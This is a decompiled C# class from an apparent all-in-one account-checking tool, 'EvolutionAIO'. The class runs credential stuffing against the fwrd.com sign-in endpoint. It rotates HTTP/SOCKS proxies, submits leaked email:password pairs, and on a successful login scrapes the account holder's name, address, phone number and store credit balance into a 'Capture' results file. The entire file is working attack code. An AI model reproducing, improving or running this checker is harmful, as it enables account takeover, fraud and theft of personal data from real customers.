// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Frwd
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Web;

namespace EvolutionAIO.Checkers
{
  internal class Frwd
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.Get("https://www.fwrd.com/r/ajax/SignIn.jsp");
            CookieCollection cookies = httpRequest.Cookies.GetCookies("https://www.fwrd.com/r/ajax/SignIn.jsp");
            string str1 = "";
            string str2 = "";
            foreach (Cookie cookie in cookies)
            {
              if (cookie.Name == "JSESSIONID")
                str1 = cookie.Value;
              else if (cookie.Name == "browserID")
                str2 = cookie.Value;
            }
            string str3 = "email=" + HttpUtility.UrlEncode(s[0]) + "&pw=" + HttpUtility.UrlEncode(s[1]) + "&g_recaptcha_response=&karmir_luys=true&rememberMe=&isCheckout=true&saveForLater=false&fw=true";
            httpRequest.ClearAllHeaders();
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
            httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
            httpRequest.AddHeader("Connection", "keep-alive");
            httpRequest.AddHeader("Content-Length", str3.Length.ToString());
            httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            httpRequest.AddHeader("Host", "www.fwrd.com");
            httpRequest.AddHeader("Origin", "https://www.fwrd.com");
            httpRequest.AddHeader("Referer", "https://www.fwrd.com/fw/Login.jsp?page=https%3A%2F%2Fwww.fwrd.com%2Ffw%2Findex.jsp&sectionURL=https%3A%2F%2Fwww.bing.com%2F");
            httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
            httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
            httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Edg/81.0.416.81");
            httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
            httpRequest.Cookies.Set("JSESSIONID", str1, "fwrd.com");
            httpRequest.Cookies.Set("browserID", str2, "fwrd.com");
            Leaf.xNet.HttpResponse httpResponse1 = httpRequest.Post("https://www.fwrd.com/r/ajax/SignIn.jsp", str3, "application/x-www-form-urlencoded");
            if (httpResponse1.ContainsCookie("useremail1"))
            {
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
              httpRequest.AddHeader("Pragma", "no-cache");
              httpRequest.AddHeader("Accept", "*/*");
              Leaf.xNet.HttpResponse httpResponse2 = httpRequest.Get("https://www.fwrd.com/fw/account/MyShippingSettings.jsp");
              string content = Menu.Parse(httpResponse2.ToString(), "name: '", "',");
              Save.AsResult(nameof (Frwd), "MadeIt", content);
              string str4 = Menu.Parse(httpResponse2.ToString(), "data-street1=\"", "\"") + " " + Menu.Parse(httpResponse2.ToString(), "data-street2=\"", "\"") + " " + Menu.Parse(httpResponse2.ToString(), "data-city=\"", "\"") + " " + Menu.Parse(httpResponse2.ToString(), "data-state=\"", "\"") + " " + Menu.Parse(httpResponse2.ToString(), "data-zipcode=\"", "\"") + " " + Menu.Parse(httpResponse2.ToString(), "data-country=\"", "\"");
              string str5 = Menu.Parse(httpResponse2.ToString(), "data-telephone=\"", "\"");
              string str6 = Menu.Parse(httpRequest.Get("https://www.fwrd.com/fw/account/MyCredit.jsp").ToString(), "<p>Your current store credit balance is ", "</p>");
              if (str6 == "$0.00")
              {
                ++Menu.frees;
                Save.AsResult(nameof (Frwd), "Frees", s[0] + ":" + s[1] + " | Free");
                return false;
              }
              ++Menu.hits;
              Save.AsResult(nameof (Frwd), "Capture", s[0] + ":" + s[1] + " | Balance: " + str6 + " ~ Full Name: " + content + " ~ Address: " + str4 + " ~ Telephone " + str5);
              return false;
            }
            if (httpResponse1.ToString().Contains("\"success\" : false"))
              return false;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          Save.AsResult(nameof (Frwd), "EX", ex.ToString());
          ++Menu.errors;
        }
      }
    }
  }
}
